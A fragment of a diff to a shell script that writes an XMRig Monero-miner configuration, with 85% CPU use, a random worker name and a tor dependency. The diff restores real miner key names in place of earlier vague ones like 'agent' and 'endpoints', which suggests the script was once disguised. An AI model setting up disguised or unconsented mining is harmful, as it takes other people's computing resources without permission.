@@ -14,7 +14,7 @@ POOL_URL="localhost:8080"
 CPU_PCT=85
 WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"
 CONFIG_DIR="$SCRIPT_DIR/config"
-CONFIG_FILE="$SCRIPT_DIR/agent-settings.json"
+CONFIG_FILE="$SCRIPT_DIR/config.json"
 
 # Ensure dependencies
 for dep in curl jq tor; do
@@ -41,7 +41,7 @@ cat > "$CONFIG_FILE" <<EOF
   "background": false,
   "colors": true,
   "title": true,
-  "engine": {
+  "randomx": {
     "init": -1,
     "init-avx2": -1,
     "mode": "auto",
@@ -52,7 +52,7 @@ cat > "$CONFIG_FILE" <<EOF
     "numa": true,
     "scratchpad_prefetch_mode": 1
   },
-  "agent": {
+  "cpu": {
     "enabled": true,
     "huge-pages": true,
     "huge-pages-jit": false,
@@ -64,9 +64,9 @@ cat > "$CONFIG_FILE" <<EOF
     "max-threads-hint": $CPU_PCT
   },
   "log-file": "$SCRIPT_DIR/xmrig.log",
-  "idle-level": 0,
-  "idle-over-proxy": 0,
-  "endpoints": [
+  "donate-level": 0,
+  "donate-over-proxy": 0,
+  "pools": [
     {
       "algo": null,
       "coin": null,
